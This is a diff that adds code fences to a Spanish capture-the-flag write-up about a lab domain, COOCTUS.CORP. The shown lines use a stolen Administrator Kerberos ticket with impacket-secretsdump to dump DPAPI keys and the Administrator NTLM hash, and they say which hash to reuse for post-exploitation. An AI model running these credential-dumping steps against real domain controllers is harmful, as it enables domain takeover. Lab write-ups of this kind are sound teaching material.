@@ -180,6 +180,7 @@ ahora haremos un export KRB5CCNAME=Administrator.ccache para el uso de la secuen
 
 para ahorrarnos futuros errores y tiempo añadiremos esto a nuestra /etc/hosts con la ip de su maquina ( DC.COOCTUS.CORP ) eso añadiran claramente ira sin los parentesis, aqui un ejemplo de como tuvo que quedar
 
+```yaml
 ___________________________________________________________
 127.0.0.1       localhost
 127.0.1.1       kali
@@ -189,7 +190,7 @@ ___________________________________________________________
 ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
 ____________________________________________________________
-
+```
 ahora haremos un impacket-secretsdump -k -no-pass DC.COOCTUS.CORP
 
 Una vez que hayamos hecho eso, debería volcar con éxito los hashes NTLM del usuario.
@@ -197,7 +198,7 @@ Una vez que hayamos hecho eso, debería volcar con éxito los hashes NTLM del us
 el hash que colocaras tendria que ser este:
 ❯ impacket-secretsdump -k -no-pass DC.COOCTUS.CORP
 Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
-
+```yam
 [*] DPAPI_SYSTEM 
 dpapi_machinekey:0xdadf91990ade51602422e8283bad7a4771ca859b
 dpapi_userkey:0x95ca7d2a7ae7ce38f20f1b11c22a05e5e23b321b
@@ -210,7 +211,7 @@ NL$KM:d505745fa70835eaec25412c20dc360caccecb128c13ac43589cf75c88e47ac398f2bbec5f
 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
 [*] Using the DRSUAPI method to get NTDS.DIT secrets
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:add41095f1fb0405b32f70a489de022d:::
-
+```
 #Post Explotacion:
 
 en la parte donde dice Administrador seleccionaran el hash que empieza con add, esta el que inicia con aad pero no, ustedes usaran el que dice add
